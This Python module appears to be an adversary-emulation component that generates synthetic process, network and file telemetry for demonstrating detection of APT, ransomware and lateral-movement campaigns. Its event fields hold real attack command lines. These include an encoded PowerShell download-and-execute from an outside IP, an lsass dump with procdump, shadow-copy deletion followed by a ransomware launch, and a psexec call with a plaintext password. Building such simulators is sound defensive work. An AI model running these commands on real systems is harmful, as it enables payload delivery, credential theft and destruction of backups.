"""
Adversary Emulation Engine (Atomic Red Team Simulator)
Generates high-fidelity multi-stage APT telemetry streams for live demonstrations.
"""
import uuid
from typing import List, Dict, Any
from datetime import datetime, timezone, timedelta

from backend.app.models.telemetry import (
    ProcessTelemetry, NetworkTelemetry, FileTelemetry, EventType
)

class AdversarySimulator:
    @staticmethod
    def generate_apt_campaign_telemetry(host_name: str = "FIN-HOST-01", host_ip: str = "10.0.4.15") -> Dict[str, Any]:
        """
        Emulates an Advanced Persistent Threat (APT) multi-stage intrusion:
        1. Phishing: outlook.exe -> winword.exe
        2. Execution: winword.exe -> powershell.exe -enc ...
        3. C2 Beacon: powershell.exe connects to 185.220.101.5:443
        4. Credential Access: powershell.exe spawns procdump.exe to dump lsass.exe
        """
        now = datetime.now(timezone.utc)
        events = []

        # Guids
        outlook_guid = f"proc-{uuid.uuid4().hex[:12]}"
        word_guid = f"proc-{uuid.uuid4().hex[:12]}"
        ps_guid = f"proc-{uuid.uuid4().hex[:12]}"
        procdump_guid = f"proc-{uuid.uuid4().hex[:12]}"

        # Step 1: User opens Word from Outlook
        t1 = (now - timedelta(seconds=25)).isoformat()
        events.append(ProcessTelemetry(
            timestamp=t1,
            event_type=EventType.PROCESS_CREATION,
            host_name=host_name,
            host_ip=host_ip,
            user_name="CORP\\sarah.connor",
            process_id=4102,
            process_guid=word_guid,
            process_name="WINWORD.EXE",
            process_path="C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
            command_line='"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" "C:\\Users\\sarah.connor\\Downloads\\Q3_Invoice_Overdue.docx"',
            parent_process_id=2210,
            parent_process_guid=outlook_guid,
            parent_process_name="OUTLOOK.EXE",
            parent_command_line='"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"'
        ))

        # Step 2: Malicious VBA Macro launches encoded PowerShell
        t2 = (now - timedelta(seconds=20)).isoformat()
        events.append(ProcessTelemetry(
            timestamp=t2,
            event_type=EventType.PROCESS_CREATION,
            host_name=host_name,
            host_ip=host_ip,
            user_name="CORP\\sarah.connor",
            process_id=5892,
            process_guid=ps_guid,
            process_name="powershell.exe",
            process_path="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            command_line='powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANQAvAHMAdABhAGcAZQAnACkA',
            parent_process_id=4102,
            parent_process_guid=word_guid,
            parent_process_name="WINWORD.EXE",
            parent_command_line='"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" "C:\\Users\\sarah.connor\\Downloads\\Q3_Invoice_Overdue.docx"'
        ))

        # Step 3: PowerShell makes C2 outbound connection
        t3 = (now - timedelta(seconds=15)).isoformat()
        events.append(NetworkTelemetry(
            timestamp=t3,
            event_type=EventType.NETWORK_CONNECTION,
            host_name=host_name,
            process_id=5892,
            process_guid=ps_guid,
            process_name="powershell.exe",
            source_ip=host_ip,
            source_port=49812,
            dest_ip="185.220.101.5",
            dest_port=443,
            protocol="TCP",
            domain="cdn-update-cloud.org"
        ))

        # Step 4: Credential Dumping execution via procdump
        t4 = (now - timedelta(seconds=8)).isoformat()
        events.append(ProcessTelemetry(
            timestamp=t4,
            event_type=EventType.PROCESS_CREATION,
            host_name=host_name,
            host_ip=host_ip,
            user_name="CORP\\sarah.connor",
            process_id=6440,
            process_guid=procdump_guid,
            process_name="procdump.exe",
            process_path="C:\\Users\\Public\\procdump.exe",
            command_line='C:\\Users\\Public\\procdump.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp minidump',
            parent_process_id=5892,
            parent_process_guid=ps_guid,
            parent_process_name="powershell.exe",
            parent_command_line='powershell.exe -ExecutionPolicy Bypass -NoProfile'
        ))

        # Step 5: Dump file created on disk
        t5 = (now - timedelta(seconds=6)).isoformat()
        events.append(FileTelemetry(
            timestamp=t5,
            event_type=EventType.FILE_MODIFICATION,
            host_name=host_name,
            process_id=6440,
            process_guid=procdump_guid,
            process_name="procdump.exe",
            file_path="C:\\Users\\Public\\lsass.dmp",
            action="created",
            file_extension=".dmp"
        ))

        return {
            "campaign_name": "APT29 Emulated Spearphishing & Credential Access",
            "events": events
        }

    @staticmethod
    def generate_ransomware_campaign_telemetry(host_name: str = "HR-SRV-02", host_ip: str = "10.0.8.22") -> Dict[str, Any]:
        """
        Emulates a Ransomware Kill Chain:
        1. Exploit execution: svchost.exe -> cmd.exe
        2. Shadow Copy Deletion: cmd.exe -> vssadmin.exe delete shadows /all /quiet
        3. Mass File Encryption: malicious.exe creates .locked files
        """
        now = datetime.now(timezone.utc)
        events = []

        cmd_guid = f"proc-{uuid.uuid4().hex[:12]}"
        vss_guid = f"proc-{uuid.uuid4().hex[:12]}"
        locker_guid = f"proc-{uuid.uuid4().hex[:12]}"

        # Step 1: Cmd execution
        t1 = (now - timedelta(seconds=18)).isoformat()
        events.append(ProcessTelemetry(
            timestamp=t1,
            event_type=EventType.PROCESS_CREATION,
            host_name=host_name,
            host_ip=host_ip,
            user_name="NT AUTHORITY\\SYSTEM",
            process_id=3112,
            process_guid=cmd_guid,
            process_name="cmd.exe",
            process_path="C:\\Windows\\System32\\cmd.exe",
            command_line='cmd.exe /c "vssadmin delete shadows /all /quiet && start C:\\ProgramData\\locker.exe"',
            parent_process_id=892,
            parent_process_guid=f"proc-{uuid.uuid4().hex[:12]}",
            parent_process_name="svchost.exe"
        ))

        # Step 2: Shadow Copy Deletion
        t2 = (now - timedelta(seconds=14)).isoformat()
        events.append(ProcessTelemetry(
            timestamp=t2,
            event_type=EventType.PROCESS_CREATION,
            host_name=host_name,
            host_ip=host_ip,
            user_name="NT AUTHORITY\\SYSTEM",
            process_id=4508,
            process_guid=vss_guid,
            process_name="vssadmin.exe",
            process_path="C:\\Windows\\System32\\vssadmin.exe",
            command_line='vssadmin.exe delete shadows /all /quiet',
            parent_process_id=3112,
            parent_process_guid=cmd_guid,
            parent_process_name="cmd.exe"
        ))

        # Step 3: Ransomware locker process
        t3 = (now - timedelta(seconds=9)).isoformat()
        events.append(ProcessTelemetry(
            timestamp=t3,
            event_type=EventType.PROCESS_CREATION,
            host_name=host_name,
            host_ip=host_ip,
            user_name="NT AUTHORITY\\SYSTEM",
            process_id=7120,
            process_guid=locker_guid,
            process_name="locker.exe",
            process_path="C:\\ProgramData\\locker.exe",
            command_line='C:\\ProgramData\\locker.exe --encrypt-local --threads 8',
            parent_process_id=3112,
            parent_process_guid=cmd_guid,
            parent_process_name="cmd.exe"
        ))

        # Step 4: Encrypted files written
        for idx, filename in enumerate(["payroll_2026.xlsx.locked", "patient_records.pdf.locked", "README_RESTORE_FILES.txt"]):
            t_file = (now - timedelta(seconds=5 - idx)).isoformat()
            events.append(FileTelemetry(
                timestamp=t_file,
                event_type=EventType.FILE_MODIFICATION,
                host_name=host_name,
                process_id=7120,
                process_guid=locker_guid,
                process_name="locker.exe",
                file_path=f"D:\\CorporateShares\\Confidential\\{filename}",
                action="encrypted",
                file_extension=".locked"
            ))

        return {
            "campaign_name": "BlackCat/ALPHV Ransomware Rapid Impact Simulation",
            "events": events
        }

    @staticmethod
    def generate_lateral_movement_campaign_telemetry(host_name: str = "OPS-WS-11", host_ip: str = "10.0.3.50") -> Dict[str, Any]:
        """
        Emulates Lateral Movement across internal domain:
        1. Compromised user on OPS-WS-11 runs PsExec targeting Domain Controller DC-01 (10.0.0.1)
        2. SMB Network connection on port 445
        3. Spawns remote admin cmd session
        """
        now = datetime.now(timezone.utc)
        events = []

        source_ps_guid = f"proc-{uuid.uuid4().hex[:12]}"
        psexec_guid = f"proc-{uuid.uuid4().hex[:12]}"
        remote_cmd_guid = f"proc-{uuid.uuid4().hex[:12]}"

        # Step 1: Initiating shell
        t1 = (now - timedelta(seconds=20)).isoformat()
        events.append(ProcessTelemetry(
            timestamp=t1,
            event_type=EventType.PROCESS_CREATION,
            host_name=host_name,
            host_ip=host_ip,
            user_name="DOMAIN\\svc_backup",
            process_id=2940,
            process_guid=source_ps_guid,
            process_name="powershell.exe",
            process_path="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            command_line="powershell.exe -ExecutionPolicy Bypass",
            parent_process_name="explorer.exe"
        ))

        # Step 2: PsExec invocation targeting Domain Controller
        t2 = (now - timedelta(seconds=15)).isoformat()
        events.append(ProcessTelemetry(
            timestamp=t2,
            event_type=EventType.PROCESS_CREATION,
            host_name=host_name,
            host_ip=host_ip,
            user_name="DOMAIN\\svc_backup",
            process_id=5128,
            process_guid=psexec_guid,
            process_name="psexec.exe",
            process_path="C:\\Tools\\psexec.exe",
            command_line='psexec.exe \\\\10.0.0.1 -u DOMAIN\\svc_backup -p P@ssw0rd2026 -s cmd.exe',
            parent_process_id=2940,
            parent_process_guid=source_ps_guid,
            parent_process_name="powershell.exe"
        ))

        # Step 3: SMB Port 445 connection to DC
        t3 = (now - timedelta(seconds=12)).isoformat()
        events.append(NetworkTelemetry(
            timestamp=t3,
            event_type=EventType.NETWORK_CONNECTION,
            host_name=host_name,
            process_id=5128,
            process_guid=psexec_guid,
            process_name="psexec.exe",
            source_ip=host_ip,
            source_port=50124,
            dest_ip="10.0.0.1",
            dest_port=445,
            protocol="TCP",
            domain="DC-PRIMARY-01.corp.internal"
        ))

        # Step 4: Remote service execution
        t4 = (now - timedelta(seconds=8)).isoformat()
        events.append(ProcessTelemetry(
            timestamp=t4,
            event_type=EventType.PROCESS_CREATION,
            host_name="DC-PRIMARY-01",
            host_ip="10.0.0.1",
            user_name="NT AUTHORITY\\SYSTEM",
            process_id=8904,
            process_guid=remote_cmd_guid,
            process_name="cmd.exe",
            process_path="C:\\Windows\\System32\\cmd.exe",
            command_line="cmd.exe /c whoami /priv",
            parent_process_name="psexesvc.exe"
        ))

        return {
            "campaign_name": "PsExec Active Directory Lateral Movement & PrivEsc",
            "events": events
        }

